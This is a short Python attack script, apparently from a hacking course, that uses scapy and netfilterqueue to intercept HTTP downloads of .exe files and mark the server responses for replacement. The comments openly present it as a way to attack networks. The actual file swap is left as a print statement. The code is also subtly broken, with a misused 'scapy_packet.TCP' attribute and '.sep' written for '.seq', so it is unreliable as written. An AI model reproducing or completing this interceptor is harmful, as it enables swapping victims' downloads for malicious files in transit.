#! /usr/bin/python3

# Scapy lets us probe, scan or attack networks.
import scapy.all as scapy
# NetfilterQueue provides access to packets matched by an iptables rule in Linux. 
# Packets so matched can be accepted, dropped, altered, or given a mark.
import netfilterqueue

ack_list = []

# Function that allow to intercept files that are going to be downloaded and then replace it
def process_packet(packet):
    # Converting packets in scapy packets
    scapy_packet = scapy.IP(packet.get_payload())
    # Check if the packet has a layer Raw
    if scapy_packet.haslayer(scapy.Raw):
        # Check if the packet has HTTP request
        if scapy_packet[scapy.TCP].dport == 80:
            # Check is there is .exe request in the Raw layer section load
            if '.exe' in scapy_packet[scapy.Raw].load:
                # Print a message that there is an .exe request
                print('[+] exe Request')
                # Append to the list the ack number
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        # Check if the TCP layer has 80 in the sport section
        elif scapy_packet[scapy_packet.TCP].sport == 80:
            # Check if the sep number is the same as the one in the ack list
            if scapy_packet[scapy_packet.TCP].sep in ack_list:
                # Print replacing file
                print('[+] Replacing file...')
                print(scapy_packet.show())

    packet.accept()

# Create a queue for the network traffic to be replaced
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


